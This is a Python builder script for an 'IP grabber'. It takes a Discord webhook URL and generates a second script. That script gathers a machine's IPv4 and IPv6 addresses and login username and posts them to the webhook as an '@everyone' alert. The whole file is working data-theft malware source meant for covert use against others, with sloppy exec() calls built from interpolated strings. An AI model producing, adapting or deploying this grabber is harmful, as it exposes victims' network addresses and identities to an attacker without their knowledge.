import os
import socket
import requests

def get_ipv4():
    try:
        ipv4 = socket.gethostbyname(socket.gethostname())
        return ipv4
    except:
        return None

def get_ipv6():
    try:
        ipv6 = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0]
        return ipv6
    except:
        return None

def get_username():
    try:
        username = os.getlogin()
        return username
    except:
        return None

ipv4 = get_ipv4()
ipv6 = get_ipv6()
username = get_username()

if ipv4:
    exec(f"ipv4_address = '{ipv4}'")
if ipv6:
    exec(f"ipv6_address = '{ipv6}'")
if username:
    exec(f"pc_username = '{username}'")

if __name__ == "__main__":
    webhook_url = input("Please enter your Discord webhook URL: ")

    # Create directory if not exists
    directory = "builds"
    if not os.path.exists(directory):
        os.makedirs(directory)

    # Writing the script to a file in the builds directory
    file_path = os.path.join(directory, "builded.py")
    with open(file_path, "w") as file:
        file.write(f"""
import socket
import os
import requests

def get_ipv4():
    try:
        ipv4 = socket.gethostbyname(socket.gethostname())
        return ipv4
    except:
        return None

def get_ipv6():
    try:
        ipv6 = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0]
        return ipv6
    except:
        return None

def get_username():
    try:
        username = os.getlogin()
        return username
    except:
        return None
      
ipv4 = get_ipv4()
ipv6 = get_ipv6()
username = get_username()

if ipv4:
    exec(f"ipv4_address = '{ipv4}'")
if ipv6:
    exec(f"ipv6_address = '{ipv6}'")
if username:
    exec(f"pc_username = '{username}'")

def send_message_to_discord(webhook_url, message):
    data = {{
        "content": message
    }}
    headers = {{
        "Content-Type": "application/json"
    }}
    response = requests.post(webhook_url, json=data, headers=headers)

if __name__ == "__main__":
    webhook_url = '{webhook_url}'
    
    ipmessage = f'''
@here @everyone 
```
HEY! NEW IP FROM ({username}) INFO:
IPv4: {{ipv4}}
IPv6: {{ipv6}}
PC USER: {{username}}
```
    '''
    
    message = f"{{ipmessage}}"

    send_message_to_discord(webhook_url, message)
""")

    print(f"Script saved to: {file_path}")
